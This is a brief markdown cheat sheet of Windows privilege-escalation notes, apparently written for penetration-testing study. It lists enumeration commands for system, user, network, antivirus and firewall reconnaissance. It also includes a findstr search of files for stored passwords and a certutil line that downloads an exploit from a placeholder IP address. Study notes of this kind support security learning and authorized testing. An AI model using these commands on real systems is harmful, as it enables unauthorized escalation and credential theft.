# Windows Privilege Escalation Notes

## Enumeration:
1. **System Enumeration:**
- `systeminfo`
- Get OS Name, OS Version, System type:    `systeminfo | findstr \B \C:"OS Name" \C:"OS Version" \C:"System Type"`
- `hostname`
- Extract Patching info using (Windows Management Insrtumentation CMD Quick Fix Engineering):    `wmic qfe`
- List Drives info:   `wmic logicaldisk get caption,description,providername`
2. **User Enumeration:**
- User Privileges:  `whoami /priv`
- List User groups:  `whoami /groups`
- List all users:  `net user`
- See User Info:   `net user <username>`
- List local groups:  `net localgroup <groupname>`
3. **Network Enumeration:**
- Network Information:  `ipconfig /all`
- List ARP Table:  `arp -a`
- Routing Table:  `route print`
- List Open Ports:  `netstat -ano`
4. **Hunting for Passwords:**
- Finding password from text or config files:  `findstr /si password *.txt *.config`
5. **AV and Firewall Enumeration:**
- List windows defender info (Service Control) : `sc query windefend`
- List all running services:  `sc queryex type=service`
- List Firewall Configurations:  `netsh advfirewall firewall dump`  OR  `netsh firewall show state` AND `netsh firewall show config`
5. **Tools:**
- Download exploit: certutil -urlcache -f "IP Addr"
